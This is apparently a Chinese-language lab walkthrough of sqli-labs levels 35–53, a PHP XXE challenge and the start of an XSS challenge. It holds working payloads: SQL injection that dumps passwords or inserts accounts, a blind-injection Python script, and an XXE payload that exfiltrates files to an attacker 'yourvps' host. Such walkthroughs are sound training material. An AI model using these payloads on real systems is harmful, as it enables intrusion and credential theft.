<h2 id="level35"><a href="#level35" class="headerlink" title="level35"></a>level35</h2><p>GET型宽字节注入，但区别是这里是数字型，不需要用单引号闭合了，其他的和less-32一样，16进制绕过一下表名即可。</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users),(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users)<span class="hljs-comment">--+</span></code></pre></div>

<h2 id="level36"><a href="#level36" class="headerlink" title="level36"></a>level36</h2><p>直接使用32关的payload</p>
<div class="hljs"><pre><code class="hljs n1ql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users),(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users)--+</code></pre></div>

<h2 id="level37"><a href="#level37" class="headerlink" title="level37"></a>level37</h2><p>和less-34一样</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">Username</span>: <span class="hljs-number">1</span>�&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#
<span class="hljs-attribute">Password</span>: 任意</code></pre></div>



<h2 id="level38"><a href="#level38" class="headerlink" title="level38"></a>level38</h2><p>堆叠注入：可以执行多条语句，用分号间隔</p>
<p>堆叠注入优点是可以执行的语句更加灵活，如Create、Delete、Update、Insert、Drop….，但代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，在前端界面是无法看到返回结果的</p>
<p>可以使用create创建一张表</p>
<div class="hljs"><pre><code class="hljs matlab"><span class="hljs-number">1</span>&#x27;;create <span class="hljs-built_in">table</span> test like users;<span class="hljs-comment">%23</span></code></pre></div>

<p>也可以向数据包中插入一条数据</p>
<div class="hljs"><pre><code class="hljs n1ql">?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;20&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)--+</code></pre></div>

<h2 id="level39"><a href="#level39" class="headerlink" title="level39"></a>level39</h2><p>和38一样，只不过这里是数字型，无需闭合。</p>
<div class="hljs"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;20&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre></div>

<h2 id="level40"><a href="#level40" class="headerlink" title="level40"></a>level40</h2><p>闭合方式不同而已</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs n1ql">?id=1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)--+</code></pre></div>

<h2 id="level41"><a href="#level41" class="headerlink" title="level41"></a>level41</h2><p>数字型注入与39关相同</p>
<div class="hljs"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre></div>

<h2 id="level42"><a href="#level42" class="headerlink" title="level42"></a>level42</h2><p>与之前几关类似，不过这里的username位置进过滤，所以需要password位置进行堆叠注入</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs n1ql">Username：usnn
Password：1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre></div>

<p>点击登录后，会发现登录失败，但是inert语句已经被执行了，可以使用admin123账号直接登录</p>
<h2 id="level43"><a href="#level43" class="headerlink" title="level43"></a>level43</h2><p>与42的闭合方式不同</p>
<p>使用的是<code>(&#39;&#39;)</code></p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs n1ql">Username：usnn
Password：1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre></div>

<h2 id="level44"><a href="#level44" class="headerlink" title="level44"></a>level44</h2><p>与42相同</p>
<div class="hljs"><pre><code class="hljs n1ql">Username：usnn
Password：1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre></div>

<h2 id="level45"><a href="#level45" class="headerlink" title="level45"></a>level45</h2><p>与43相同</p>
<div class="hljs"><pre><code class="hljs n1ql">Username：usnn
Password：1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre></div>

<h2 id="level46"><a href="#level46" class="headerlink" title="level46"></a>level46</h2><p><code>order by</code>注入</p>
<p><code>username</code>、<code>password</code>均为列名，所以以下需要知道列名</p>
<div class="hljs"><pre><code class="hljs pgsql">?<span class="hljs-keyword">order</span>=<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span>)
?<span class="hljs-keyword">order</span>=<span class="hljs-keyword">null</span>,<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span>)
?<span class="hljs-keyword">order</span>=(<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (<span class="hljs-number">1</span>=<span class="hljs-number">1</span>) <span class="hljs-keyword">then</span> username <span class="hljs-keyword">else</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">end</span>)
?<span class="hljs-keyword">order</span>=ifnull(<span class="hljs-keyword">null</span>, username)
?<span class="hljs-keyword">order</span>=rand(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>)    //<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> rand(<span class="hljs-number">1</span>)/rand(<span class="hljs-number">0</span>)两者返回不一样
?<span class="hljs-keyword">order</span>=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> regexp <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x00</span>))</code></pre></div>

<p>将<code>1=1</code>换成bool盲注的语句函数即可用于获取数据<br><code>sort=rand(ascii(database(),1))=115)</code></p>
<p>时间盲注</p>
<div class="hljs"><pre><code class="hljs pgsql">sort=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">116</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>))
sort=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>(substring(<span class="hljs-keyword">current</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-type">char</span>(<span class="hljs-number">115</span>),benchmatrk(<span class="hljs-number">5000000</span>,md5(<span class="hljs-string">&#x27;1&#x27;</span>)),<span class="hljs-keyword">null</span>) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">as</span> <span class="hljs-keyword">current</span>) <span class="hljs-keyword">as</span> tb1)</code></pre></div>

<p>Bool 盲注</p>
<div class="hljs"><pre><code class="hljs pgsql">rand(ascii(left(<span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>)</code></pre></div>

<p>报错注入：</p>
<div class="hljs"><pre><code class="hljs pgsql">updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,version()),<span class="hljs-number">2</span>),<span class="hljs-number">1</span>)
(<span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,floor(rand()*<span class="hljs-number">2</span>)))</code></pre></div>

<p>procedure analyse 参数后注入</p>
<div class="hljs"><pre><code class="hljs cal">sort=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">analyse</span><span class="hljs-params">(extractvalue(rand()</span>,<span class="hljs-title">concat</span><span class="hljs-params">(0x3a,version()</span>)),1)</span></code></pre></div>

<p>into outfile参数:</p>
<div class="hljs"><pre><code class="hljs applescript"><span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfield <span class="hljs-string">&quot;path&quot;</span></code></pre></div>

<p>上传网马，可以在后面加上<code>lines terminated by 16</code>进制转码的数据</p>
<h2 id="level47"><a href="#level47" class="headerlink" title="level47"></a>level47</h2><p>与46的闭合防止不用，使用报错注入</p>
<div class="hljs"><pre><code class="hljs n1ql">?sort=1&#x27; and extractvalue(1,concat(0x7e,( <span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>))--+</code></pre></div>

<h2 id="level48"><a href="#level48" class="headerlink" title="level48"></a>level48</h2><p>使用时间盲注</p>
<div class="hljs"><pre><code class="hljs lisp"><span class="hljs-number">1</span> and If(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;115,<span class="hljs-number">0</span>,sleep (<span class="hljs-number">5</span>))--+
sort=rand(<span class="hljs-name">ascii</span>(<span class="hljs-name">left</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>))=115)</code></pre></div>

<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">&#x27;http://127.0.0.1/Less-48/</span>
<span class="hljs-string">payloads = &#x27;</span>QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_<span class="hljs-string">&#x27;</span>
<span class="hljs-string">data = &#x27;</span><span class="hljs-string">&#x27;</span>
<span class="hljs-string">for i in range(50):</span>
<span class="hljs-string">    for j in payloads:</span>
<span class="hljs-string">        # payload = f&quot;?sort=1 and if((substr(binary database(),&#123;i&#125;,1)=&#x27;</span>&#123;j&#125;<span class="hljs-string">&#x27;),sleep(3),1)&quot;</span>
<span class="hljs-string">        # payload = f&quot;?sort=1 and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)=&#x27;</span>&#123;j&#125;<span class="hljs-string">&#x27;),sleep(3),1)&quot;</span>
<span class="hljs-string">        payload = f&quot;?sort=1 and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27;) ,&#123;i&#125;,1)=&#x27;</span>&#123;j&#125;<span class="hljs-string">&#x27;),sleep(3),1)&quot;       </span>
<span class="hljs-string">        try:</span>
<span class="hljs-string">            r = requests.get(url+payload, timeout=1)</span>
<span class="hljs-string">        except Exception:</span>
<span class="hljs-string">            data += j</span>
<span class="hljs-string">            print(data)</span>
<span class="hljs-string">            break</span></code></pre></div>

<h2 id="level49"><a href="#level49" class="headerlink" title="level49"></a>level49</h2><p>与47的闭合方式不同，但是可以使用盲注</p>
<div class="hljs"><pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-constructor">If(<span class="hljs-params">ascii</span>(<span class="hljs-params">substr</span>(<span class="hljs-params">database</span>()</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">0</span>,sleep (<span class="hljs-number">5</span>))--+
<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> (<span class="hljs-constructor">If(<span class="hljs-params">ascii</span>(<span class="hljs-params">substr</span>((<span class="hljs-params">select</span> <span class="hljs-params">username</span> <span class="hljs-params">from</span> <span class="hljs-params">users</span> <span class="hljs-params">where</span> <span class="hljs-params">id</span>=1)</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>)))--+</code></pre></div>

<h2 id="level50"><a href="#level50" class="headerlink" title="level50"></a>level50</h2><p>order by与堆叠注入结合，数字型</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs pgsql">?sort=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre></div>

<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507103942074.png" srcset="/img/loading.gif" alt="image-20210507103942074" style="zoom:50%;">



<h2 id="level51"><a href="#level51" class="headerlink" title="level51"></a>level51</h2><p>与50关相比增加单引号闭合</p>
<div class="hljs"><pre><code class="hljs pgsql">?sort=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre></div>

<h2 id="level52"><a href="#level52" class="headerlink" title="level52"></a>level52</h2><p>与50相同</p>
<div class="hljs"><pre><code class="hljs pgsql">?sort=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre></div>

<h2 id="level53"><a href="#level53" class="headerlink" title="level53"></a>level53</h2><p>和51一样，只是不会回显错误，堆叠注入方式相同。</p>
<div class="hljs"><pre><code class="hljs n1ql">?sort=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)--+</code></pre></div>

<h1 id="xxe挑战"><a href="#xxe挑战" class="headerlink" title="xxe挑战"></a>xxe挑战</h1><p>github地址：<a target="_blank" rel="noopener" href="https://github.com/vulnspy/phpaudit-XXE/archive/master.zip">https://github.com/vulnspy/phpaudit-XXE/archive/master.zip</a></p>
<p>因为环境搭建比较简单就直接在windows上运行了</p>
<p>读取的文件也随之改变，在D盘中建立一个1.txt</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303194816074.png" srcset="/img/loading.gif" alt="image-20210303194816074"></p>
<h2 id="DOMDocument"><a href="#DOMDocument" class="headerlink" title="DOMDocument"></a>DOMDocument</h2><p>使用如下payload读取文件</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span>
<span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">content</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;content;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303194904746.png" srcset="/img/loading.gif" alt="image-20210303194904746"></p>
<p>漏洞原因</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210330213939369.png" srcset="/img/loading.gif" alt="image-20210330213939369" style="zoom:67%;">

<p>DOmDocument类</p>
<p><code>$dom = new DOMDocument();</code></p>
<div class="hljs"><pre><code class="hljs php">libxml_disable_entity_loader(<span class="hljs-literal">false</span>);
<span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;
    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();
    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$data</span>, LIBXML_NOENT);
    ob_start();
    var_dump(<span class="hljs-variable">$dom</span>);
    <span class="hljs-variable">$resp</span> = ob_get_contents();
    ob_end_clean();
    
&#125;</code></pre></div>

<h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h2><p>使用payload：</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span>
<span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">content</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;content;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303195204160.png" srcset="/img/loading.gif" alt="image-20210303195204160"></p>
<p>漏洞代码</p>
<p>造成 XXE 的类是 SimpleXMLElement</p>
<div class="hljs"><pre><code class="hljs php">libxml_disable_entity_loader(<span class="hljs-literal">false</span>);
<span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;
    <span class="hljs-variable">$xml</span> = <span class="hljs-keyword">new</span> SimpleXMLElement(<span class="hljs-variable">$data</span>, LIBXML_NOENT);
    ob_start();
    var_dump(<span class="hljs-variable">$xml</span>);
    <span class="hljs-variable">$resp</span> = ob_get_contents();
    ob_end_clean();   
&#125;</code></pre></div>

<h2 id="simplexml-load-string"><a href="#simplexml-load-string" class="headerlink" title="simplexml_load_string"></a>simplexml_load_string</h2><p>payload:</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span>
<span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">content</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;content;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre></div>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303195407342.png" srcset="/img/loading.gif" alt="image-20210303195407342"></p>
<p>造成漏洞的是simplexml_load_string，代码如下</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;
    <span class="hljs-variable">$xml</span> = simplexml_load_string(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);
    ob_start();
    var_dump(<span class="hljs-variable">$xml</span>);
    <span class="hljs-variable">$resp</span> = ob_get_contents();
    ob_end_clean();
    
&#125;</code></pre></div>



<h2 id="BlindXXE"><a href="#BlindXXE" class="headerlink" title="BlindXXE"></a>BlindXXE</h2><p>这一关提交payload无法看到内容，但是可以看到是访问成功的</p>
<p>正常情况下，只会返回给我们ok，即有查询结果，但是不会告诉我们结果是什么</p>
<p>源码如下</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]))&#123;
    show_source(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-keyword">exit</span>;
&#125;
libxml_disable_entity_loader(<span class="hljs-literal">false</span>);
<span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;
    <span class="hljs-variable">$xml</span> = simplexml_load_string(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$xml</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xml</span>-&gt;name))&#123;
        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$xml</span>-&gt;name;
    &#125;
   <span class="hljs-keyword">echo</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$name</span>)?<span class="hljs-string">&#x27;ok&#x27;</span>:<span class="hljs-string">&#x27;error&#x27;</span>; 
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>上面的例子是因为<code>echo htmlspecialchars($resp);</code>这句代码所以才有回显，那么把这段代码去掉，就变成了无回显。那么，是不是就不能进行xxe了呢，答案是否定的，虽然靶机没有返回给我们数据，但是我们可以把数据带到我们自己的服务器上。</p>
<p>我们传入如下的payload：</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE a [</span>
<span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/convert.base64-encode/resource=D:/1.txt&quot;</span>&gt;</span></span>
<span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://yourvps/evil.xml&quot;</span>&gt;</span></span>
<span class="hljs-meta">    %dtd;</span>
<span class="hljs-meta">    %send;</span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">abc</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">abc</span>&gt;</span></code></pre></div>

<p>然后在自己的vps上的<strong>evil.xml</strong>写入：</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">payload</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://yourvps/?content=%file;&#x27;&gt;&quot;</span>&gt;</span> %payload;</code></pre></div>

<p>注意，因为这里是参数实体payload来<strong>嵌套定义</strong>参数实体<strong>send</strong>，所以被<strong>嵌套定义</strong>的参数实体<code>%</code>一定要HTML编码为：<code>%</code></p>
<p>如此一来，调用的过程就变成了：参数实体dtd通过<strong>http</strong>协议来访问vps上的<strong>evil.xml</strong>，然后返回<strong>evil.xml</strong>的内容，调用了参数实体<strong>payload</strong>，然后<strong>payload</strong>又调用了参数实体<strong>send</strong>，<strong>send</strong>的作用就是把参数实体<strong>file</strong>（即文件D:/1.txt的base64编码内容）发送到我们的vps上，注意在服务器上监听</p>
<h1 id="xss通关"><a href="#xss通关" class="headerlink" title="xss通关"></a>xss通关</h1><p>因为网上有挑战题目的网址就没在本地搭建</p>
<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>最基础的xss，get提交</p>
<div class="hljs"><pre><code class="hljs javascript">?name=<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303151729341.png" srcset="/img/loading.gif" alt="image-20210303151729341"></p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>第二关直接提交会发现没有弹窗</p>
<p>查看源码可以看到，因为<code>&lt;script&gt;</code>，被包裹在<code>input</code>标签中无法起作用，因此需要先闭合<code>input</code>标签</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303152358665.png" srcset="/img/loading.gif" alt="image-20210303152358665" style="zoom:50%;">



<p>payload</p>
<div class="hljs"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303152632625.png" srcset="/img/loading.gif" alt="image-20210303152632625" style="zoom:50%;">



<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>直接提交查看源码</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303152721584.png" srcset="/img/loading.gif" alt="image-20210303152721584"></p>
<p>可以发现提交后的数据经过<code>htmlspecialchars()</code>转化成了实体变量不在有js代码的作用，所以需要换一种方法</p>
<p>payload</p>
